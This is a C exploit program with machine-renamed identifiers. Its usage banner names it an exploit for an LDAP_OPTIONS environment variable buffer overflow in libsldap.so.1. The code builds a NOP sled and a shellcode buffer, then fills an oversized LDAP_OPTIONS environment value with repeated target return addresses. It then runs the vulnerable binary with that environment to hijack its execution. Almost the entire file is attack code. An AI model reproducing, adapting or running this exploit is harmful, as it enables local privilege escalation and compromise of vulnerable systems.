
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct TYPE_2__ {char* string; int retaddr; int path; } ;


 size_t VAR_0 ;
 size_t FUNC_0 (char*) ;
 int* VAR_1 ;
 int VAR_2 ;
 int FUNC_1 (int ,char*,char*,int ) ;
 int FUNC_2 (int ) ;
 int FUNC_3 (int ,char*,char*) ;
 size_t VAR_3 ;
 int* VAR_4 ;
 int FUNC_4 (int*,char*,int) ;
 int FUNC_5 (int*,int,int) ;
 int VAR_5 ;
 int* VAR_6 ;
 int VAR_7 ;
 int FUNC_6 (int*) ;
 TYPE_1__* VAR_8 ;

FUNC_7(int VAR_9, char *VAR_10[])
{

      if(!VAR_10[1])
      {
              FUNC_3(VAR_7, "libsldap.so.1 $LDAP_OPTIONS enviroment variable buffer overflow\nExploit code: noir@gsu.linux.org.tr\nBug discovery: sway@hack.co.za\n\nUsage: %s target#\n\n", VAR_10[0]);

      for(VAR_3 = 0; VAR_8[VAR_3].string != ((void*)0); VAR_3++)
      FUNC_3(VAR_7,"target#: %s\n", VAR_8[VAR_3].string);
      FUNC_2(0);
      }

  VAR_5 = VAR_8[FUNC_0(VAR_10[1])].retaddr;

  FUNC_5(VAR_1, 0x00, sizeof VAR_1);
  for(VAR_3 = 0 ; VAR_3 < 400 - FUNC_6(VAR_6) ; VAR_3 +=4)
  *(long *)&VAR_1[VAR_3] = 0xa61cc013;
  for (VAR_3= 0 ; VAR_3 < FUNC_6(VAR_6); VAR_3++)
     VAR_1[200+VAR_3]=VAR_6[VAR_3];

 for ( VAR_3 = 0; VAR_3 < VAR_0; VAR_3++) VAR_4[VAR_3]=0x58;
 for (VAR_3 = VAR_0; VAR_3 < 4000; VAR_3+=4)
    {
      VAR_4[VAR_3+3]=VAR_5 & 0xff;
      VAR_4[VAR_3+2]=(VAR_5 >> 8 ) &0xff;
      VAR_4[VAR_3+1]=(VAR_5 >> 16 ) &0xff;
      VAR_4[VAR_3+0]=(VAR_5 >> 24 ) &0xff;
    }
FUNC_4(VAR_4, "LDAP_OPTIONS=", 13);

VAR_4[FUNC_6(VAR_4) - 3] = 0x00;

FUNC_1(VAR_8[FUNC_0(VAR_10[1])].path, "12341234", (char *)0, VAR_2);

}
